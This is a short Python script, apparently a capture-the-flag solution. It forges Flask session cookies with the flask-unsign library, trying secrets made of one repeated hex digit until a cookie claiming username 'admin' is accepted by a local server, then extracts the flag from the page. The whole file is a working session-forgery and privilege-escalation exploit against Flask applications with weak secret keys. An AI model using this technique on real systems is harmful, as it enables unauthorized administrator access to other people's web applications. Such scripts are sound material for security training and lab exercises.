#!/usr/bin/env python3
from string import hexdigits

# python3 -m pip install requests flask-unsign
from requests import get
from flask_unsign import session, DEFAULT_SALT

for c in hexdigits:
    secret = c * 32
    session_cookie = session.sign(
        value={"username": "admin"}, secret=secret, salt=DEFAULT_SALT, legacy=False
    )

    cookies = {"session": session_cookie}
    print("Trying with '" + c + "' ...")
    req = get("http://127.0.0.1:5000/", cookies=cookies)

    if not "You are not admin !" in req.text:
        print("Flag :", req.text.split("<h3>")[1].split("</h3>")[0])
        break
